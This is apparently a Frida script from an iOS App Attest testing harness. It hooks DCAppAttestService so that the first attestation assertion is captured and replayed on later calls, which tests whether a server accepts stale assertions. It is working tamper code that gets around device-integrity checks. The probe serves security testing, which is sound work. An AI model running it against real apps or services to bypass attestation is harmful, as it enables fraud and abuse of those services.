// Probe: REPLAY. The first assertion the app obtains under the hook is kept;
// every later generateAssertion call is answered with that SAME blob. Its
// authenticatorData carries the counter of the first call, so a server that
// enforces a strictly increasing counter (and a fresh server challenge bound
// into clientDataHash) refuses; a server that accepts it is REPLAYABLE (F4).
// Needs at least two assertion calls in the probe window. Hygiene.
'use strict';
let __hooked = 0;
let __first = null;
if (ObjC.available) {
  try {
    const S = ObjC.classes.DCAppAttestService;
    for (const sel of ['generateAssertion:clientDataHash:completionHandler:',
                       'generateAssertionWithKeyId:clientDataHash:completionHandler:']) {
      const m = S && S['- ' + sel];
      if (m) {
        __hooked++; Interceptor.attach(m.implementation, {
          onEnter(a) {
            const i = sel.split(':').length;
            const b = new ObjC.Block(a[i]); const orig = b.implementation;
            b.implementation = function (assertion, err) {
              try {
                if (__first === null) {
                  if (assertion && !assertion.isNull()) {
                    __first = ObjC.classes.NSData.dataWithData_(new ObjC.Object(assertion));
                    __first.retain();
                    console.log('[replay] captured first assertion (' + __first.length() + ' bytes)');
                  }
                } else {
                  console.log('ATTESTPROBE HIT replay');
                  return orig(__first, NULL);
                }
              } catch (e) { console.log('[replay] ' + e); }
              return orig(assertion, err);
            };
          }
        });
        console.log('[replay] hooked ' + sel);
      }
    }
    if (__hooked) console.log('ATTESTPROBE ARMED replay'); else console.log('ATTESTPROBE NOHOOK replay');
  } catch (e) { console.log('[replay] ' + e); }
}
